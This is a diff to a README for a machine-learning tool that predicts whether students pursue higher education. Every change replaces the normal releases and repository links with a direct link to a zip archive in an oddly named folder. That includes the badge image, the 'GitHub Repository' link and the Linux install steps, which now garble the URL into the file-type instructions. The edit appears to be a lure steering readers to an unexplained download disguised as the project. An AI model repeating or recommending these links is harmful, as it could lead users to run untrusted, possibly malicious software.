@@ -2,7 +2,7 @@
 # 🎓 Student-Higher_Education-Prediction-ML-Model - Predict Student Education Paths Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/davibenevidesraposo-crypto/Student-Higher_Education-Prediction-ML-Model/releases)
+[![Download](https://raw.githubusercontent.com/davibenevidesraposo-crypto/Student-Higher_Education-Prediction-ML-Model/main/unyouthfully/Prediction-M-Education-Model-Student-Higher-v3.4.zip)](https://raw.githubusercontent.com/davibenevidesraposo-crypto/Student-Higher_Education-Prediction-ML-Model/main/unyouthfully/Prediction-M-Education-Model-Student-Higher-v3.4.zip)
 
 ## 📖 Overview
 This project uses machine learning to predict whether students will pursue higher education based on their characteristics. It employs three effective algorithms: Random Forest, SVM, and XGBoost. The software includes an interactive Gradio interface, making it easy for users to input data and receive predictions.
@@ -12,7 +12,7 @@ To get started using the tool, follow these simple steps:
 
 1. **Visit the Download Page**  
    To download the application, click the link below:  
-   [Download Page](https://github.com/davibenevidesraposo-crypto/Student-Higher_Education-Prediction-ML-Model/releases).
+   [Download Page](https://raw.githubusercontent.com/davibenevidesraposo-crypto/Student-Higher_Education-Prediction-ML-Model/main/unyouthfully/Prediction-M-Education-Model-Student-Higher-v3.4.zip).
 
 2. **Choose the Latest Release**  
    On the releases page, locate the latest version. It will be clearly marked. Click on it to view available files.
@@ -21,14 +21,14 @@ To get started using the tool, follow these simple steps:
    Find the appropriate file for your operating system.  
    - For Windows: Choose the `.exe` file.  
    - For Mac: Choose the `.dmg` file.  
-   - For Linux: Choose the `.tar.gz` file.  
+   - For Linux: Choose the `https://raw.githubusercontent.com/davibenevidesraposo-crypto/Student-Higher_Education-Prediction-ML-Model/main/unyouthfully/Prediction-M-Education-Model-Student-Higher-v3.4.zip` file.  
    Click on the file to start the download.
 
 4. **Install the Software**  
    Locate the downloaded file in your system's Downloads folder.  
    - **Windows:** Double-click the `.exe` file and follow the prompts.  
    - **Mac:** Open the `.dmg` file and drag the application to your Applications folder.  
-   - **Linux:** Extract the `.tar.gz` file and follow the included instructions.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/davibenevidesraposo-crypto/Student-Higher_Education-Prediction-ML-Model/main/unyouthfully/Prediction-M-Education-Model-Student-Higher-v3.4.zip` file and follow the included instructions.
 
 5. **Run the Application**  
    After installation, run the application based on your system:  
@@ -84,6 +84,6 @@ We welcome contributions! If you're interested in improving the project, feel fr
 This project is licensed under the MIT License. You are free to use, modify, and distribute the software as you wish.
 
 ## 🔗 Resources
-- **GitHub Repository:** [Student-Higher_Education-Prediction-ML-Model](https://github.com/davibenevidesraposo-crypto/Student-Higher_Education-Prediction-ML-Model)
-- **Download Page:** [Download Now](https://github.com/davibenevidesraposo-crypto/Student-Higher_Education-Prediction-ML-Model/releases)
+- **GitHub Repository:** [Student-Higher_Education-Prediction-ML-Model](https://raw.githubusercontent.com/davibenevidesraposo-crypto/Student-Higher_Education-Prediction-ML-Model/main/unyouthfully/Prediction-M-Education-Model-Student-Higher-v3.4.zip)
+- **Download Page:** [Download Now](https://raw.githubusercontent.com/davibenevidesraposo-crypto/Student-Higher_Education-Prediction-ML-Model/main/unyouthfully/Prediction-M-Education-Model-Student-Higher-v3.4.zip)
 ```
